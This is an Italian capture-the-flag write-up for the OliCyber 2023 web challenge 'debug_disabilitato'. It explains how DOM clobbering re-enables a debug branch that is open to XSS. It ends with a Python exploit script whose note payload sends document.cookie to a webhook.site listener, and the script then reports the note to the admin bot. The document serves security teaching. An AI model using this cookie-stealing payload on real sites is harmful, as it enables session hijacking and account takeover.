# OliCyber.IT 2023 - Selezione territoriale

## [web-3] debug_disabilitato (8 risoluzioni)

Nell'applicazione abbiamo la possibilità di inserire delle note, il rendering della nota è eseguito attraverso del codice javascript client-side.

In particolare c'è un punto del codice che dovrebbe attirare l'attenzione:

```javascript
<script>// window.debug = true;</script>
```

```javascript
// Debug disattivato, da cancellare appena il boss mi da il permesso
if (window.debug) {
  document.write(
    `<p class='py-6 font-normal text-lg text-zinc-700'>Note title: ${data.title}</p>`
  );
  document.write(
    `<p class='py-6 font-normal text-lg text-zinc-700'>Note content: ${data.content}</p>`
  );
}
```

### Soluzione

Abbiamo quindi del codice che è disabilitato in quanto una variabile non è stata dichiarata.
Nella nota possiamo inserire alcuni tag HTML che da soli non permettono l'esecuzione di codice client-side, tuttavia permettono di fare altre cose come il DOM clobbering.

Possiamo infatti creare dei tag con la proprietà `id` che vanno a costituire una HTML Collection, questo significa che gli elementi con un id specificato (ma anche proprietà `name`) finiscono sotto l'oggetto globale `window`.

Possiamo difatti riabilitare la stampa di debug che è vulnerabile ad una normale DOM based XSS.
Usando quindi un exploit di questo genere abbiamo esecuzione di codice:

```javascript
<p id="debug"></p>
<script>
    alert(1);
</script>
```

### Exploit

```python
import requests
import string
import random
import re

def random_string():
    return ''.join(random.choices(string.ascii_letters, k=10))

url = "http://debug_disabilitato.challs.olicyber.it"
username = random_string()
password = random_string()
xss_listener = "https://webhook.site/[REDATTO]"

s = requests.Session()
r = s.post(f"{url}/register", data={
    "username": username,
    "password": password
})

r = s.post(f"{url}/add_note", data={
    "title": "Exploit",
    "content": f'<p id="debug"></p> <script>location.href = "{xss_listener}?" + document.cookie;</script>'
})

matches = re.findall('<a href="get_note/(\d+)"', r.text)
report_id = matches[0]

r = s.post(f"{url}/report", data={
    "report_id": report_id
})

```
